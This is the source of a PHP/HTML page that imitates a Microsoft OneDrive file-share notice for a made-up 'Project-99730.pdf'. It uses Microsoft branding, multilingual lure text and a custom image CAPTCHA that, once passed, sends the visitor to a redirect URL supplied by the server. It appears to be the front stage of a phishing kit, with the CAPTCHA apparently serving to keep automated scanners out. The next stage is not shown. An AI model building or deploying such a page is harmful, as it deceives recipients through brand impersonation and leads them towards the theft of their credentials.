<?php
$today = (new DateTime('now', new DateTimeZone('Europe/Berlin')))->format('F j, Y');
?>
<!DOCTYPE html>
<html lang="en-GB">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Project-99730.pdf</title>
    <link rel="icon" href="img.php?k=icon" type="image/svg+xml">
    <style>
        :root {
            --blue: #0078d4;
            --blue-dark: #005a9e;
            --blue-soft: #eff6fc;
            --text: #242424;
            --muted: #707070;
            --line: #e0e0e0;
            --white: #ffffff;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: "Segoe UI", "Segoe UI Web", -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(180deg, #f5f8fc 0%, #eef3f8 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
            color: var(--text);
            -webkit-font-smoothing: antialiased;
        }

        .auth-card {
            background: var(--white);
            width: 400px;
            max-width: 100%;
            border-radius: 6px;
            padding: 36px 32px 28px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.06), 0 12px 32px rgba(0,0,0,0.08);
            border: 1px solid var(--line);
            animation: cardIn 0.45s ease forwards;
            opacity: 0;
        }

        @keyframes cardIn {
            from { opacity: 0; transform: translateY(12px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .brand-block {
            text-align: center;
            margin-bottom: 28px;
        }

        .brand-logo {
            width: 108px;
            height: auto;
            display: block;
            margin: 0 auto 10px;
        }

        .od-wordmark {
            font-size: 17px;
            font-weight: 600;
            color: var(--blue);
            letter-spacing: -0.02em;
        }

        .file-info {
            background: var(--blue-soft);
            border: 1px solid #d6e9f8;
            border-radius: 6px;
            padding: 16px;
            margin-bottom: 22px;
            display: flex;
            align-items: flex-start;
            gap: 14px;
        }

        .file-icon {
            width: 40px;
            height: 40px;
            flex-shrink: 0;
            margin-top: 2px;
        }

        .file-details { flex: 1; min-width: 0; text-align: left; }

        .file-name {
            font-size: 14px;
            font-weight: 600;
            color: var(--text);
            line-height: 1.35;
            word-break: break-word;
        }

        .file-meta {
            font-size: 12px;
            color: var(--muted);
            margin-top: 5px;
        }

        .subtext {
            font-size: 13.5px;
            color: var(--muted);
            line-height: 1.55;
            margin-bottom: 22px;
            text-align: left;
        }

        .cta-button {
            display: block;
            width: 100%;
            background: var(--blue);
            color: #fff;
            padding: 11px 20px;
            font-size: 14px;
            font-weight: 600;
            font-family: inherit;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background 0.15s;
        }

        .cta-button:hover { background: var(--blue-dark); }

        .footer-note {
            margin-top: 18px;
            font-size: 11.5px;
            color: #8a8a8a;
            text-align: center;
            line-height: 1.45;
        }

        .captcha-overlay {
            position: fixed;
            inset: 0;
            background: rgba(36, 36, 36, 0.4);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10000;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.2s, visibility 0.2s;
            padding: 20px;
        }

        .captcha-overlay.active { opacity: 1; visibility: visible; }

        .captcha-card {
            background: var(--white);
            width: 392px;
            max-width: 100%;
            border-radius: 6px;
            box-shadow: 0 8px 28px rgba(0,0,0,0.18);
            border: 1px solid var(--line);
            overflow: hidden;
            transform: translateY(14px);
            transition: transform 0.25s ease;
        }

        .captcha-overlay.active .captcha-card { transform: translateY(0); }

        .captcha-header {
            background: var(--blue);
            color: #fff;
            padding: 16px 18px 14px;
        }

        .captcha-header h2 {
            font-size: 14px;
            font-weight: 600;
            line-height: 1.4;
        }

        .captcha-header p {
            font-size: 12px;
            opacity: 0.92;
            margin-top: 4px;
            font-weight: 400;
        }

        .captcha-body { padding: 18px; position: relative; }

        .image-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 7px;
            margin-bottom: 16px;
        }

        .tile {
            position: relative;
            aspect-ratio: 1;
            border: 2px solid #d1d1d1;
            border-radius: 3px;
            background: #fafafa;
            cursor: pointer;
            overflow: hidden;
            padding: 0;
            transition: border-color 0.12s;
        }

        .tile:hover { border-color: var(--blue); }

        .tile.selected {
            border-color: var(--blue);
            background: var(--blue-soft);
        }

        .tile img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            padding: 10px;
            pointer-events: none;
        }

        .tile-check {
            position: absolute;
            top: 5px;
            right: 5px;
            width: 20px;
            height: 20px;
            border-radius: 2px;
            background: var(--blue);
            display: flex;
            align-items: center;
            justify-content: center;
            opacity: 0;
            transform: scale(0.85);
            transition: opacity 0.12s, transform 0.12s;
        }

        .tile.selected .tile-check {
            opacity: 1;
            transform: scale(1);
        }

        .tile-check svg { width: 13px; height: 13px; fill: #fff; }

        .captcha-actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 10px;
        }

        .captcha-actions button {
            font-family: inherit;
            font-size: 13px;
            font-weight: 600;
            border-radius: 4px;
            cursor: pointer;
            padding: 8px 14px;
            border: none;
        }

        .btn-refresh {
            background: #fff;
            color: var(--muted);
            border: 1px solid #d1d1d1 !important;
            font-weight: 500;
        }

        .btn-refresh:hover { background: #f5f5f5; }

        .btn-verify {
            background: var(--blue);
            color: #fff;
            min-width: 88px;
        }

        .btn-verify:hover { background: var(--blue-dark); }
        .btn-verify:disabled { opacity: 0.5; cursor: default; }

        .captcha-loading {
            position: absolute;
            inset: 0;
            background: rgba(255,255,255,0.92);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 5;
        }

        .captcha-loading.hidden { display: none; }

        .captcha-spinner {
            width: 26px;
            height: 26px;
            border: 2px solid #e5e5e5;
            border-top-color: var(--blue);
            border-radius: 50%;
            animation: spin 0.65s linear infinite;
            margin-bottom: 8px;
        }

        .captcha-loading p { font-size: 12px; color: var(--muted); }

        @keyframes spin { to { transform: rotate(360deg); } }

        .error-banner {
            background: #fde7e9;
            color: #a4262c;
            font-size: 12px;
            padding: 8px 10px;
            border-radius: 4px;
            margin-bottom: 12px;
            display: none;
        }

        .error-banner.visible { display: block; }

        .captcha-footer {
            display: flex;
            justify-content: flex-end;
            align-items: center;
            gap: 5px;
            padding: 10px 18px 12px;
            border-top: 1px solid #f0f0f0;
            font-size: 10px;
            color: #9a9a9a;
        }

        .captcha-footer svg { width: 14px; height: 14px; fill: #9a9a9a; }
    </style>
</head>
<body>

    <div class="auth-card">
        <div class="brand-block">
            <img class="brand-logo" src="img.php?k=logo" alt="OneDrive">
            <div class="od-wordmark">OneDrive</div>
        </div>

        <div class="file-info">
            <svg class="file-icon" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                <rect x="4" y="2" width="28" height="32" rx="3" fill="#eff6fc" stroke="#0078d4" stroke-width="1.5"/>
                <line x1="10" y1="12" x2="26" y2="12" stroke="#0078d4" stroke-width="1.5" opacity="0.35"/>
                <line x1="10" y1="18" x2="26" y2="18" stroke="#0078d4" stroke-width="1.5" opacity="0.35"/>
                <line x1="10" y1="24" x2="20" y2="24" stroke="#0078d4" stroke-width="1.5" opacity="0.35"/>
            </svg>
            <div class="file-details">
                <div class="file-name">Project-99730.pdf</div>
                <div class="file-meta">312 KB &bull; Shared <?= htmlspecialchars($today, ENT_QUOTES, 'UTF-8') ?></div>
            </div>
        </div>

        <p class="subtext" id="subtext">This file was shared with you through OneDrive. Only authorised recipients may open it.</p>
        <button class="cta-button" id="accessBtn">Open file</button>
        <div class="footer-note" id="footerNote">Secured by Microsoft OneDrive</div>
    </div>

    <div class="captcha-overlay" id="captchaOverlay">
        <div class="captcha-card">
            <div class="captcha-header">
                <h2 id="captchaTitle">Select all images with cars</h2>
                <p id="captchaSubtitle">Tap each matching image, then press Verify.</p>
            </div>
            <div class="captcha-body">
                <div class="captcha-loading" id="captchaLoading">
                    <div class="captcha-spinner"></div>
                    <p>Loading images...</p>
                </div>
                <div class="error-banner" id="errorBanner"></div>
                <div class="image-grid" id="imageGrid"></div>
                <div class="captcha-actions">
                    <button type="button" class="btn-refresh" id="refreshBtn">New challenge</button>
                    <button type="button" class="btn-verify" id="verifyBtn" disabled>Verify</button>
                </div>
            </div>
            <div class="captcha-footer">
                <span>Verification required</span>
                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                    <path d="M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
                </svg>
            </div>
        </div>
    </div>

    <script>
    (function () {
        const overlay      = document.getElementById('captchaOverlay');
        const grid         = document.getElementById('imageGrid');
        const loadingEl    = document.getElementById('captchaLoading');
        const errorBanner  = document.getElementById('errorBanner');
        const verifyBtn    = document.getElementById('verifyBtn');
        const refreshBtn   = document.getElementById('refreshBtn');
        const captchaTitle = document.getElementById('captchaTitle');

        let challengeToken = '';
        let selected = new Set();

        const translations = {
            es: { subtext: 'Este archivo se compartió contigo a través de OneDrive. Solo los destinatarios autorizados pueden abrirlo.', accessBtn: 'Abrir archivo', footerNote: 'Protegido por Microsoft OneDrive', captchaSubtitle: 'Selecciona cada imagen coincidente y pulsa Verificar.' },
            de: { subtext: 'Diese Datei wurde über OneDrive für Sie freigegeben. Nur autorisierte Empfänger können sie öffnen.', accessBtn: 'Datei öffnen', footerNote: 'Geschützt durch Microsoft OneDrive', captchaSubtitle: 'Wählen Sie alle passenden Bilder aus und klicken Sie auf Überprüfen.' },
            fr: { subtext: 'Ce fichier a été partagé avec vous via OneDrive. Seuls les destinataires autorisés peuvent l\'ouvrir.', accessBtn: 'Ouvrir le fichier', footerNote: 'Sécurisé par Microsoft OneDrive', captchaSubtitle: 'Sélectionnez chaque image correspondante, puis vérifiez.' }
        };

        const lang = (navigator.language || navigator.userLanguage || '').substring(0, 2).toLowerCase();
        if (translations[lang]) {
            document.getElementById('subtext').textContent = translations[lang].subtext;
            document.getElementById('accessBtn').textContent = translations[lang].accessBtn;
            document.getElementById('footerNote').textContent = translations[lang].footerNote;
            document.getElementById('captchaSubtitle').textContent = translations[lang].captchaSubtitle;
        }

        function hideError() {
            errorBanner.classList.remove('visible');
            errorBanner.textContent = '';
        }

        function showError(msg) {
            errorBanner.textContent = msg;
            errorBanner.classList.add('visible');
        }

        function renderGrid(tiles) {
            grid.innerHTML = '';
            selected = new Set();
            verifyBtn.disabled = true;
            hideError();

            tiles.forEach(function (tile) {
                const btn = document.createElement('button');
                btn.type = 'button';
                btn.className = 'tile';
                btn.dataset.id = String(tile.id);
                btn.innerHTML =
                    '<img src="img.php?k=' + encodeURIComponent(tile.type) + '" alt="">' +
                    '<span class="tile-check"><svg viewBox="0 0 24 24"><path d="M9 16.2 4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"/></svg></span>';

                btn.addEventListener('click', function () {
                    const id = parseInt(btn.dataset.id, 10);
                    if (selected.has(id)) {
                        selected.delete(id);
                        btn.classList.remove('selected');
                    } else {
                        selected.add(id);
                        btn.classList.add('selected');
                    }
                    verifyBtn.disabled = selected.size === 0;
                });

                grid.appendChild(btn);
            });
        }

        async function loadChallenge() {
            loadingEl.classList.remove('hidden');
            verifyBtn.disabled = true;
            refreshBtn.disabled = true;
            hideError();

            try {
                const res = await fetch('api.php?action=challenge');
                const data = await res.json();
                if (data.error) {
                    showError(data.error);
                    return;
                }

                challengeToken = data.token;
                captchaTitle.textContent = 'Select all images with ' + data.label;
                renderGrid(data.tiles);
            } catch (e) {
                showError('Could not load verification. Please refresh.');
            } finally {
                loadingEl.classList.add('hidden');
                refreshBtn.disabled = false;
            }
        }

        async function submitVerification() {
            if (!challengeToken || selected.size === 0) return;

            loadingEl.querySelector('p').textContent = 'Verifying...';
            loadingEl.classList.remove('hidden');
            verifyBtn.disabled = true;
            refreshBtn.disabled = true;
            hideError();

            try {
                const res = await fetch('api.php?action=verify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        token: challengeToken,
                        selected: Array.from(selected)
                    })
                });
                const data = await res.json();

                if (data.status === 'success') {
                    window.location.href = data.redirect;
                    return;
                }

                showError(data.message || 'Incorrect selection. Try again.');
                setTimeout(loadChallenge, 900);
            } catch (e) {
                showError('Network error. Try again.');
                loadingEl.classList.add('hidden');
                verifyBtn.disabled = false;
                refreshBtn.disabled = false;
            }
        }

        document.getElementById('accessBtn').addEventListener('click', function () {
            overlay.classList.add('active');
            loadChallenge();
        });

        overlay.addEventListener('click', function (e) {
            if (e.target === overlay) {
                overlay.classList.remove('active');
            }
        });

        verifyBtn.addEventListener('click', submitVerification);
        refreshBtn.addEventListener('click', loadChallenge);
    })();
    </script>
</body>
</html>
